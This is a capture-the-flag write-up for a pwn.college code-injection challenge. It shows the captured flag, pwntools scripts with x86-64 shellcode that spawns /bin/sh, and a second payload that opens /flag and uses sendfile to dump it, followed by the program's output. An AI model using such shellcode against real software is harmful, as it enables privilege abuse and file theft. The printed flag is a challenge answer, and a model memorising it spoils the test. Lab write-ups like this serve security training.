# Basic Shellcode

## Flag :
`pwn.college{MwZfWmOCYVbZjJKHR0YPZ5tSCUq.01NxIDLzQjN0czW}`

### Solve : 

when we run the binary it asks for input. i wrote a.s which gives us shellcode access and used ipython to send it since copying the objcopy will not work due to unprintable chars not copying properly.

```
from pwn import *

context.arch = 'amd64'

shellcode = asm('''
    mov rax, 59
    lea rdi, [rip+binsh]
    mov rsi, 0
    mov rdx, 0
    syscall
binsh:
    .string "/bin/sh"
''')

p = process('./binary-exploitation-basic-shellcode')
p.send(shellcode)
p.interactive()
```

but this doesnt work since only the binary has elevated perms and even getting rce doesnt allow us to read the flag so i used the sendfile and openFlag syscalls to directly interact with elevated permissions instead of opening a shell.


```python
In [6]: from pwn import *
   ...:
   ...: context.arch = 'amd64'
   ...:
   ...: shellcode = asm('''
   ...:     /* open("/flag", O_RDONLY) */
   ...:     mov rax, 2                    
   ...:     lea rdi, [rip+flag]           
   ...:     xor rsi, rsi                  
   ...:     xor rdx, rdx                  
   ...:     syscall
   ...:
   ...:     /* sendfile */
   ...:     mov rdi, 1                    
   ...:     mov rsi, rax                  /* fd from open */
   ...:     xor rdx, rdx                  
   ...:     mov r10, 0x1000               
   ...:     mov rax, 40                   /* sys_sendfile instruction */
   ...:     syscall
   ...:
   ...:
   ...: flag:
   ...:     .string "/flag"
   ...: ''')
   ...:
   ...: p = process('./binary-exploitation-basic-shellcode')
   ...: p.send(shellcode)
   ...: print(p.recvall())
   ...:
[x] Starting local process './binary-exploitation-basic-shellcode'
[+] Starting local process './binary-exploitation-basic-shellcode': pid 254
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 532B
[x] Receiving all data: 884B
[x] Receiving all data: 1.55KB
[x] Receiving all data: 2.00KB
[*] Process './binary-exploitation-basic-shellcode' stopped with exit code -4 (SIGILL) (pid 254)
[+] Receiving all data: Done (2.00KB)
b'###\n### Welcome to ./binary-exploitation-basic-shellcode!\n###\n\nThis challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them\nas code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will\npractice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing\nother tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n\nIn this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every\nexecution, your shellcode will need to be *position-independent*.\n\nAllocated 0x1000 bytes for shellcode on the stack at 0x7ffd706a33c0!\nReading 0x1000 bytes from stdin.\n\nThis challenge is about to execute the following shellcode:\n\n      Address      |                      Bytes                    |          Instructions\n------------------------------------------------------------------------------------------\n0x00007ffd706a33c0 | 48 c7 c0 02 00 00 00                          | mov rax, 2\n0x00007ffd706a33c7 | 48 8d 3d 25 00 00 00                          | lea rdi, [rip + 0x25]\n0x00007ffd706a33ce | 48 31 f6                                      | xor rsi, rsi\n0x00007ffd706a33d1 | 48 31 d2                                      | xor rdx, rdx\n0x00007ffd706a33d4 | 0f 05                                         | syscall \n0x00007ffd706a33d6 | 48 c7 c7 01 00 00 00                          | mov rdi, 1\n0x00007ffd706a33dd | 48 89 c6                                      | mov rsi, rax\n0x00007ffd706a33e0 | 48 31 d2                                      | xor rdx, rdx\n0x00007ffd706a33e3 | 49 c7 c2 00 10 00 00                          | mov r10, 0x1000\n0x00007ffd706a33ea | 48 c7 c0 28 00 00 00                          | mov rax, 0x28\n0x00007ffd706a33f1 | 0f 05                                         | syscall \n\nExecuting shellcode!\n\npwn.college{MwZfWmOCYVbZjJKHR0YPZ5tSCUq.01NxIDLzQjN0czW}\n'
```